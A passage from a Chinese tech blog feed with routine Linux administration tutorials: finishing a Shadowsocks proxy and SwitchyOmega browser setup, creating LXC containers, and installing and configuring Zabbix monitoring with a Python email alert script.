class="line">至此设置完成</span><br></pre></td></tr></table></figure><ul><li>点击firefox，进行访问，在浏览器右上角点击小圆圈选择<code>auto swith</code>,然后访问google吧</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ tail /var/log/shadowsocks.log </span><br><span class="line">INFO: loading config from /etc/shadowsocks/config.json</span><br><span class="line">2018-07-25 21:15:49 INFO   starting local at 127.0.0.1:1080</span><br><span class="line">2018-07-25 22:18:31 INFO   connecting www.google.com:443 from 127.0.0.1:49532</span><br><span class="line">2018-07-25 22:18:31 INFO   connecting www.google.com:443 from 127.0.0.1:49536</span><br><span class="line">2018-07-25 22:18:31 INFO   connecting www.google.com:443 from 127.0.0.1:49540</span><br></pre></td></tr></table></figure><ul><li>chrome代理设置</li></ul><blockquote><p><a href="https://github.com/FelisCatus/SwitchyOmega/releases" target="_blank" rel="noopener">SwitchyOmega</a>下载github上的chrome的.crx文件.</p><p>进入chrome浏览器，进入拓展管理页面，勾选开发模式，把下载好的crx文件拖入插件区域即可。</p><p>后续可以参照firefox即可。</p></blockquote><p>如果拖拽不了.crx文件，请使用下面的命令进入chrome，即可安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># /opt/google/chrome/chrome --enable-easy-off-store-extension-install</span><br></pre></td></tr></table></figure><p>感谢阅读！</p><h2 id="踏坑学习"><a href="#踏坑学习" class="headerlink" title="踏坑学习"></a>踏坑学习</h2><ul><li>安装shadowsocks</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install shadowsocks</span><br></pre></td></tr></table></figure><p>后面的操作基本上面进行，依然访问不了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail -f /var/log/shadowsocks.log </span><br><span class="line">2018-07-25 22:18:31 INFO  clinet connecting denied</span><br></pre></td></tr></table></figure><p>这里权限拒绝，是支持的加密方式可能和我的VPS不一样 。安装最新的shadowscoks即可解决问题！</p><h1 id="ubuntu-lxc容器创建"><a href="#ubuntu-lxc容器创建" class="headerlink" title="ubuntu-lxc容器创建"></a>ubuntu-lxc容器创建</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lxc*     #搭建lxc    </span><br><span class="line">sudo apt-get install yum #搭建yum</span><br><span class="line">sudo lxc-create -n temp -t centos #创建centos系统主机名为temp。</span><br><span class="line">sudo chroot /var/lib/lxc/temp/rootfs passwd#输入root密码</span><br><span class="line">sudo lxc-copy -n temp -N node01#fork新的虚拟机以temp为模板。</span><br><span class="line">sudo lxc-ls</span><br><span class="line">sudo lxc-ls -f#查看容器信息</span><br><span class="line">sudo lxc-start -n node01#开启 node01</span><br><span class="line">sudo lxc-console -n node01#进入 node01</span><br><span class="line">sudo lxc-ls -f</span><br><span class="line">ssh root@10.0.3.116#ssh连接</span><br><span class="line">sudo lxc-info -n node01</span><br><span class="line">sudo lxc-start temp</span><br><span class="line">sudo lxc-info -n temp</span><br><span class="line">sudo lxc-stop -n node01#停止服务</span><br><span class="line">sudo lxc-destroy -n node01#销毁容器</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="server" scheme="https://fenghong.tech/categories/server/"/>
    
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="ubuntu" scheme="https://fenghong.tech/tags/ubuntu/"/>
    
      <category term="shadowsocks" scheme="https://fenghong.tech/tags/shadowsocks/"/>
    
      <category term="chrome" scheme="https://fenghong.tech/tags/chrome/"/>
    
      <category term="SwitchyOmega" scheme="https://fenghong.tech/tags/SwitchyOmega/"/>
    
  </entry>
  
  <entry>
    <title>Zabbix</title>
    <link href="https://fenghong.tech/zabbix.html"/>
    <id>https://fenghong.tech/zabbix.html</id>
    <published>2018-07-24T01:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>监控系统满足的条件</li><li>Zabbix概述</li><li>Zabbix安装配置及相关术语</li><li>Zabbix实现QQ邮箱通知监控</li></ul><h1 id="监控系统满足的条件"><a href="#监控系统满足的条件" class="headerlink" title="监控系统满足的条件"></a>监控系统满足的条件</h1><ul><li>采集</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">agentless: SSH/Telnet</span><br><span class="line">SNMP: simple network manage protocal </span><br><span class="line">UDP</span><br><span class="line">IPMI: intelligent </span><br><span class="line">jmx(java management eXtensions):</span><br><span class="line">agent:</span><br><span class="line">sensor</span><br></pre></td></tr></table></figure><ul><li>存储</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NVPS (New Values Per Second)</span><br><span class="line">Zabbix:MySQL,PGSQL...PHP...</span><br><span class="line">Cacti:rrd(round-robin database)...SNMP...Nagios</span><br><span class="line">Prometheus: NOSQL,Agent(exporter),Time Series /Streaming Databases.... PHP</span><br></pre></td></tr></table></figure><ul><li>可视化</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gafana #一个图形界面</span><br></pre></td></tr></table></figure><ul><li>告警</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nagios,bash shell</span><br></pre></td></tr></table></figure><h2 id="Zabbix组件概述"><a href="#Zabbix组件概述" class="headerlink" title="Zabbix组件概述"></a>Zabbix组件概述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Zabbix server</span><br><span class="line">Database Storage</span><br><span class="line">Web interface</span><br><span class="line">Proxy</span><br><span class="line">Agent</span><br></pre></td></tr></table></figure><h1 id="zabbix介绍"><a href="#zabbix介绍" class="headerlink" title="zabbix介绍"></a>zabbix介绍</h1><blockquote><p>zabbix是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。</p><p>zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。</p><p><strong>zabbix由2部分构成，zabbix server与可选组件zabbix agent。</strong></p><p><strong>zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，</strong>它可以运行在Linux, Solaris, HP-UX, AIX, Free BSD, Open BSD, OS X等平台上。</p><p><strong>zabbix agent需要安装在被监视的目标服务器上，它主要完成对硬件信息或与操作系统有关的内存，CPU等信息的收集。</strong>zabbix agent可以运行在Linux,Solaris,HP-UX,AIX,Free BSD,Open BSD, OS X, Tru64/OSF1, Windows NT4.0, Windows (2000/2003/XP/Vista)等系统之上。</p><p>zabbix server可以单独监视远程服务器的服务状态；同时也可以与zabbix agent配合，可以轮询zabbix agent主动接收监视数据（agent方式），同时还可被动接收zabbix agent发送的数据（trapping方式）。</p><p>另外zabbix server还支持SNMP (v1,v2)，可以与SNMP软件(例如：net-snmp)等配合使用。</p></blockquote><p>zabbix程序的组件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">zabbix_server：服务端守护进程；</span><br><span class="line">zabbix_agentd：agent守护进程；</span><br><span class="line">zabbix_proxy：代理服务器，可选组件；</span><br><span class="line">zabbix_get：命令行工具，手动测试向agent发起数据采集请求；</span><br><span class="line">zabbix_sender：命令行工具，运行于agent端，手动向server端发送数据；</span><br><span class="line">zabbix_java_gateway: java网关；</span><br><span class="line">zabbix_database：MySQL或PostgreSQL；</span><br><span class="line">zabbix_web：Web GUI</span><br></pre></td></tr></table></figure><p>zabbix逻辑组件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">主机组(host group)</span><br><span class="line">主机 (hosts)</span><br><span class="line">监控项(item)</span><br><span class="line">key：实现获取监控的目标上的数据的命令或脚本的名称；</span><br><span class="line">应用(application)：同一类监控项的集合；</span><br><span class="line">触发器(trigger)：表达式；PROBLEM， OK；</span><br><span class="line">事件(event)：</span><br><span class="line">动作(action)：由条件(condition)和操作(operation)组件；</span><br><span class="line">媒介(media)：发送通知的通道；</span><br><span class="line">通知(notification)：</span><br><span class="line">远程命令(remote command)：</span><br><span class="line">报警升级()：</span><br><span class="line">模板(template)：快速定义被监控主机的各监控项的预设项目集合；</span><br><span class="line">图形(graph)：用于展示历史数据或趋势数据的图像；</span><br><span class="line">屏幕(screen)：由多个graph组成；</span><br></pre></td></tr></table></figure><h1 id="Zabbix安装"><a href="#Zabbix安装" class="headerlink" title="Zabbix安装"></a>Zabbix安装</h1><h2 id="Zabbix镜像选择"><a href="#Zabbix镜像选择" class="headerlink" title="Zabbix镜像选择"></a>Zabbix镜像选择</h2><p>仓库准备，这里选择国内的阿里云镜像（也可以选择清华源），这里使用zabbix3.4</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/yum.repos.d/zabbix.repo</span><br><span class="line">[zabbix]</span><br><span class="line">name=zabbix</span><br><span class="line">baseurl=https://mirrors.aliyun.com/zabbix/zabbix/3.4/rhel/7/x86_64/</span><br><span class="line">gpgcheck=0</span><br><span class="line"></span><br><span class="line">[zabbix-non]</span><br><span class="line">name=zabbixnon</span><br><span class="line">baseurl=https://mirrors.aliyun.com/zabbix/non-supported/rhel/7/x86_64/          </span><br><span class="line">gpgcheck=0</span><br><span class="line">##复制到从节点一份</span><br><span class="line">]# scp /etc/yum.repos.d/zabbix.repo node01:/etc/yum.repos.d/</span><br></pre></td></tr></table></figure><h2 id="安装并配置Zabbix-Server"><a href="#安装并配置Zabbix-Server" class="headerlink" title="安装并配置Zabbix_Server"></a>安装并配置Zabbix_Server</h2><ol><li>开始安装<code>Zabbix server, frontend, agent, get</code>;搭建<code>lamp</code>环境，如果不会可以看前面的博客<a href="http://fenghong.tech/Lamp.html">lamp</a>搭建</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># yum install zabbix-server-mysql zabbix-web-mysql zabbix-agent zabbix-get -y</span><br><span class="line"># yum install -y httpd mariadb-server php php-mysql</span><br></pre></td></tr></table></figure><ol start="2"><li>创建数据库，授权zabbix用户并导入数据。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">]# systemctl start mariadb httpd</span><br><span class="line">]# mysql -uroot -ppassword</span><br><span class="line">mysql&gt; create database zabbix character set utf8 collate utf8_bin;</span><br><span class="line">mysql&gt; grant all privileges on zabbix.* to zabbix@&apos;192.168.1.%&apos; identified by &apos;centos&apos;;</span><br><span class="line">]# zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -pcentos zabbix -h192.168.1.18</span><br></pre></td></tr></table></figure><ol start="3"><li>编辑zabbix_server.conf,修改数据库的密码项及主机，其他不变动</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/zabbix/zabbix_server.conf</span><br><span class="line">LogFile=/var/log/zabbix/zabbix_server.log</span><br><span class="line">LogFileSize=0</span><br><span class="line">PidFile=/var/run/zabbix/zabbix_server.pid</span><br><span class="line">SocketDir=/var/run/zabbix</span><br><span class="line">DBHost=192.168.1.18</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=centos</span><br><span class="line">SNMPTrapperFile=/var/log/snmptrap/snmptrap.log</span><br><span class="line">Timeout=4</span><br><span class="line">AlertScriptsPath=/usr/lib/zabbix/alertscripts</span><br><span class="line">ExternalScripts=/usr/lib/zabbix/externalscripts</span><br><span class="line">LogSlowQueries=3000</span><br></pre></td></tr></table></figure><ol start="4"><li>修改httpd下的zabbix.conf文件的时区</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">]# vim /etc/httpd/conf.d/zabbix.conf</span><br><span class="line">php_value date.timezone Asia/Shanghai   #修改为上海时区。</span><br></pre></td></tr></table></figure><ol start="5"><li>启动服务</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">]# systemctl restart zabbix-server zabbix-agent httpd</span><br><span class="line">]# systemctl enable zabbix-server zabbix-agent http</span><br></pre></td></tr></table></figure><p>访问<code>http://host/zabbix</code>，进行傻瓜式安装，安装生成的配置文件：<code>/etc/zabbix/web/zabbix.conf.php</code></p><p>安装配置好后进入登录界面，默认用户名Admin，密码zabbix。</p><h2 id="配置Agent端"><a href="#配置Agent端" class="headerlink" title="配置Agent端"></a>配置Agent端</h2><ul><li>node01</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y zabbix-agent</span><br><span class="line"></span><br><span class="line">Unit file： zabbix-agent.service</span><br></pre></td></tr></table></figure><ul><li>配置说明</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">配置文件：/etc/zabbix/zabbix_agentd.conf </span><br><span class="line">############ GENERAL PARAMETERS #################</span><br><span class="line">##### Passive checks related</span><br><span class="line">被动监控相关配置</span><br><span class="line">##### Active checks related</span><br><span class="line">主动监控相关配置，agent端主动向server周期性发送数据；</span><br><span class="line">############ ADVANCED PARAMETERS #################</span><br><span class="line">####### USER-DEFINED MONITORED PARAMETERS #######</span><br><span class="line">用户自定义参数</span><br><span class="line">####### LOADABLE MODULES #######</span><br><span class="line">####### TLS-RELATED PARAMETERS #######</span><br><span class="line"></span><br><span class="line">##### Passive checks related</span><br><span class="line">Server=IP1, IP2, ...</span><br><span class="line">ListenPort=10050</span><br><span class="line">ListenIP=0.0.0.0</span><br><span class="line">StartAgents=3</span><br><span class="line"></span><br><span class="line">##### Active checks related</span><br><span class="line">ServerActive=IP1[:port], IP2[:port], ...</span><br><span class="line">Hostname=Unique_HOSTNAME</span><br><span class="line">必须与服务器配置的监控主机的主机名称保持一致；</span><br></pre></td></tr></table></figure><h1 id="zabbix术语"><a href="#zabbix术语" class="headerlink" title="zabbix术语"></a>zabbix术语</h1><ul><li>zabbix入门</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">监控系统：</span><br><span class="line">    采集 --&gt; 存储(MySQL/PGSQL/Sqlite) --&gt; 报警 --&gt; 可视化    </span><br><span class="line">zabbix：</span><br><span class="line">    采集：</span><br><span class="line">        agent/snmp/IPMI/jmx         </span><br><span class="line">    设备：主机(hosts) --&gt; 主机组(hostgroups)</span><br><span class="line">         监控项(items) --&gt; 应用组(applications)</span><br><span class="line">         触发器(triggers, 表达式) --&gt; trigger events</span><br><span class="line">         动作(actions, CONDITIONS, OPERATIONS, RECOVERY OPERATIONS)</span><br><span class="line">            OPERATIONS：</span><br><span class="line">                remote command</span><br><span class="line">                send message --&gt; USERS (media)</span><br><span class="line">            Media Type：Email/</span><br><span class="line">                </span><br><span class="line">    可视化：</span><br><span class="line">        graph, slide show, map       </span><br><span class="line">        grafana:</span><br></pre></td></tr></table></figure><ul><li>配置流程说明</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">术语：host groups --&gt; host --&gt; application --&gt; item --&gt; trigger --&gt; action (conditions, operations)</span><br><span class="line">    graph: </span><br><span class="line">simple: 每个item定义完成后自动生成 </span><br><span class="line">customed：用于将多个item的数据整合于一个图形中展示</span><br></pre></td></tr></table></figure><ul><li>items</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">items: key+parameter</span><br><span class="line">key: </span><br><span class="line">zabbix内建：</span><br><span class="line">type: </span><br><span class="line">agent (server:pull)</span><br><span class="line">agent(active) (agent:push)</span><br><span class="line">snmp v1</span><br><span class="line">...</span><br><span class="line">用户自定义(UserParameter)</span><br><span class="line"></span><br><span class="line">采集到的数据的类型：</span><br><span class="line">数值：</span><br><span class="line">整数</span><br><span class="line">浮点数 </span><br><span class="line">字符串：</span><br><span class="line">字符串</span><br><span class="line">文本</span><br><span class="line"></span><br><span class="line">存储的值：</span><br><span class="line">As is：不对数据做任何处理</span><br><span class="line">Delta：（simple change)，本次采样减去前一次采样的值的结果</span><br><span class="line">Delta：（speed per second)，本次采样减去前一次采样的值，再除以经过的时长；</span><br></pre></td></tr></table></figure><ul><li>trigger</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">trigger：</span><br><span class="line">    界定某特定的item采集到的数据的非合理区间或非合理状态：逻辑表达式 </span><br><span class="line">    </span><br><span class="line">逻辑表达式，阈值；通常用于定义数据的不合理区间；</span><br><span class="line">OK：正常 状态 --&gt; 较老的zabbix版本，其为FALSE；</span><br><span class="line">PROBLEM：非正常 状态 --&gt; 较老的zabbix版本，其为TRUE；</span><br><span class="line"></span><br><span class="line">OK --&gt; PROBLEM </span><br><span class="line">Recovery：PROBLEM --&gt; OK </span><br><span class="line"></span><br><span class="line">触发器存在可调用的函数：</span><br><span class="line">nodata()</span><br><span class="line">last()</span><br><span class="line">date()</span><br><span class="line">time() </span><br><span class="line">now()</span><br><span class="line">dayofmonth()</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Severity：严重等级</span><br><span class="line">Not classified</span><br><span class="line">Information</span><br><span class="line">Warning</span><br><span class="line">Average</span><br><span class="line">High</span><br><span class="line">Disaster</span><br><span class="line"></span><br><span class="line">触发器表达式：</span><br><span class="line">&#123;hostname:key[paramters].function(arguments) </span><br><span class="line">&gt;, &lt;, =, #（not equal）...</span><br><span class="line">+, -, *, /</span><br><span class="line">&amp;, |</span><br><span class="line"></span><br><span class="line">&#123;n1.magedu.com:net.if.in[eno16777736,packets].last(#1)&#125;&gt;15</span><br><span class="line"></span><br><span class="line">trigger间存在依赖关系：</span><br><span class="line">        zabbix server &lt;--&gt; Router1 &lt;--&gt; Host1</span><br><span class="line"> </span><br><span class="line"> 事件机制：</span><br><span class="line">    四种事件源：trigger, discovery, auto registration, internal</span><br></pre></td></tr></table></figure><ul><li><p>Media</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Media：媒介</span><br><span class="line">告警信息的传递通道；</span><br><span class="line">类型：</span><br><span class="line">Email：邮件</span><br><span class="line">Script：自定义脚本</span><br><span class="line">SMS：短信</span><br><span class="line">Jabber：</span><br><span class="line">Ez Texting：</span><br><span class="line"></span><br><span class="line">接收信息的目标为zabbix用户：</span><br><span class="line">需要用户上定义对应各种媒介通道的接收方式；</span><br></pre></td></tr></table></figure></li><li><p>Action</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">conditions：</span><br><span class="line">多个条件之间存在逻辑关系；</span><br><span class="line">operations：</span><br><span class="line">条件满足时触发的操作；</span><br><span class="line"></span><br><span class="line">send message：</span><br><span class="line">(1) Media type：传递信息的通道；</span><br><span class="line">(a) Email</span><br><span class="line">(b) Script：报警脚本；</span><br><span class="line">脚本放置路径：zabbix_server.conf配置文件中AlertScriptsPath参数定义的路径下；</span><br><span class="line">/usr/lib/zabbix/alertscripts/</span><br><span class="line">zabbix服务器在调用脚本时，会向其传递三个参数：</span><br><span class="line">$1：经由此信道接收信息的目标；</span><br><span class="line">$2：subject</span><br><span class="line">$3：body</span><br><span class="line"></span><br><span class="line">            zabbix 3.0之后的版本，此三个变量定义为内部宏：</span><br><span class="line">                &#123;ALERT.SENDTO&#125;</span><br><span class="line">                &#123;ALERT.SUBJECT&#125;</span><br><span class="line">                &#123;ALERT.MESSAGE&#125;</span><br><span class="line">                </span><br><span class="line">(2) 信息接收人：</span><br><span class="line">(a) User Groups</span><br><span class="line">(b) Users</span><br><span class="line">            admin:</span><br></pre></td></tr></table></figure><ul><li>Python报警脚本示例：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line"></span><br><span class="line">import smtplib</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.header import Header</span><br><span class="line">from email.utils import parseaddr, formataddr</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def formatAddr(s):</span><br><span class="line">    name, addr = parseaddr(s)</span><br><span class="line">    return formataddr((Header(name, &apos;utf-8&apos;).encode(), addr))</span><br><span class="line"></span><br><span class="line">def send_mail(to_list,subject,content):</span><br><span class="line">    mail_host = &apos;smtp.exmail.qq.com&apos;</span><br><span class="line">    mail_user = &apos;USERNAME@DOMAIN.TLD&apos;</span><br><span class="line">    mail_pass = &apos;YOUR_PASSWORD&apos;</span><br><span class="line">    #以上内容根据你的实际情况进行修改,pass为stmp的授权码。</span><br><span class="line">    msg = MIMEText(content,&apos;&apos;,&apos;utf-8&apos;)</span><br><span class="line">    msg[&apos;Subject&apos;] = Header(subject, &apos;utf-8&apos;).encode()</span><br><span class="line">    msg[&apos;From&apos;] = formatAddr(&apos;zabbix监控 &lt;%s&gt;&apos; % mail_user).encode()</span><br><span class="line">    msg[&apos;to&apos;] = to_list</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        s = smtplib.SMTP()</span><br><span class="line">        s.connect(mail_host)</span><br><span class="line">        s.login(mail_user,mail_pass)</span><br><span class="line">        s.sendmail(mail_user,to_list,msg.as_string())</span><br><span class="line">        s.close()</span><br><span class="line">        return True</span><br><span class="line">    except Exception,e:</span><br><span class="line">        print str(e)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    send_mail(sys.argv[1], sys.argv[2], sys.argv[3])</span><br></pre></td></tr></table></figure><ul><li>remote command</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">功能：</span><br><span class="line">在agent所在的主机上运行用户指定的命令或脚本；例如：</span><br><span class="line">重启服务；</span><br><span class="line">通过IPMI重启服务器；</span><br><span class="line">任何用户自定义脚本中定义的操作； </span><br><span class="line"></span><br><span class="line">可执行的命令类型：</span><br><span class="line">IPMI</span><br><span class="line">ssh </span><br><span class="line">telnet </span><br><span class="line">Custom Script</span><br><span class="line">Global Script</span><br><span class="line"></span><br><span class="line">前提：</span><br><span class="line">在agent需要完成的配置：</span><br><span class="line">(1) zabbix用户拥有所需要的管理权限；</span><br><span 